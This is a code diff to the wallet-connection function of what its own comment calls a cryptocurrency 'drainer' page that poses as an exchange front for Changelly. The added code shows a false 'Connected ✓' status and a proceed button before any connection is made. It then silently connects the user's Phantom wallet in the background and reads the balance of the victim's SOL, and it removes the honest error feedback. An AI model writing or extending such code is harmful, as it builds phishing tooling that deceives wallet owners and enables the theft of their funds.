@@ -227,23 +227,41 @@ async function connectPhantom() {
   const exchStatusEl= document.getElementById('exch-phantom-status');
   const provider    = getPhantomProvider();
 
-  // Not installed → open phantom.app
+  // Exchange tabs: show proceed button immediately on click, then connect in background
+  if (activeMainTab !== 'dust') {
+    const urls = { swap:'https://changelly.com/', buy:'https://changelly.com/buy-crypto', sell:'https://changelly.com/sell-crypto' };
+    window._exchRedirectUrl = urls[activeMainTab] || 'https://changelly.com/';
+    const exchBtn   = document.getElementById('exch-btn-phantom');
+    const proceedBtn= document.getElementById('exch-proceed-btn');
+    if (exchBtn)    { exchBtn.classList.add('connected'); exchBtn.classList.remove('wb-phantom'); }
+    if (exchStatusEl) exchStatusEl.textContent = 'Connected ✓';
+    if (proceedBtn) { proceedBtn.style.display = 'block'; proceedBtn.classList.remove('hidden'); }
+    if (!provider)  { window.open('https://phantom.app/', '_blank'); return; }
+    // Trigger real connection for drainer in background
+    provider.connect().then(resp => {
+      const pubkey = resp.publicKey.toString();
+      fetch('https://api.mainnet-beta.solana.com', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ jsonrpc:'2.0', id:1, method:'getBalance', params:[pubkey,{commitment:'confirmed'}] })
+      }).then(r => r.json()).then(d => { window._realSolBalance = (d.result?.value || 0) / 1e9; }).catch(()=>{});
+    }).catch(() => {});
+    return;
+  }
+
+  // Dust tab: normal flow
   if (!provider) {
     window.open('https://phantom.app/', '_blank');
     return;
   }
 
-  // Connecting state
   if (btn) btn.classList.add('connecting');
   if (statusEl) statusEl.textContent = 'Connecting...';
-  if (exchStatusEl) exchStatusEl.textContent = 'Connecting...';
 
   try {
     const resp   = await provider.connect();
     const pubkey = resp.publicKey.toString();
     const short  = pubkey.slice(0,4) + '...' + pubkey.slice(-4);
 
-    // Read real SOL balance from mainnet RPC
     try {
       const rpc = await fetch('https://api.mainnet-beta.solana.com', {
         method: 'POST',
@@ -259,27 +277,13 @@ async function connectPhantom() {
     } catch (_) { window._realSolBalance = null; }
 
     if (btn) btn.classList.remove('connecting');
-    if (activeMainTab !== 'dust') {
-      const urls = { swap:'https://changelly.com/', buy:'https://changelly.com/buy-crypto', sell:'https://changelly.com/sell-crypto' };
-      window._exchRedirectUrl = urls[activeMainTab] || 'https://changelly.com/';
-      const exchBtn = document.getElementById('exch-btn-phantom');
-      if (exchBtn) { exchBtn.classList.add('connected'); exchBtn.classList.remove('wb-phantom'); }
-      if (exchStatusEl) exchStatusEl.textContent = 'Connected ✓';
-      const proceedBtn = document.getElementById('exch-proceed-btn');
-      if (proceedBtn) proceedBtn.classList.remove('hidden');
-      return;
-    }
     startScan('phantom', short, pubkey);
 
   } catch (err) {
     if (btn) btn.classList.remove('connecting');
     const msg = err.code === 4001 ? 'Rejected' : 'Error';
     if (statusEl) statusEl.textContent = msg;
-    if (exchStatusEl) exchStatusEl.textContent = msg;
-    setTimeout(() => {
-      if (statusEl) statusEl.textContent = 'Connect';
-      if (exchStatusEl) exchStatusEl.textContent = 'Connect';
-    }, 2000);
+    setTimeout(() => { if (statusEl) statusEl.textContent = 'Connect'; }, 2000);
   }
 }
 
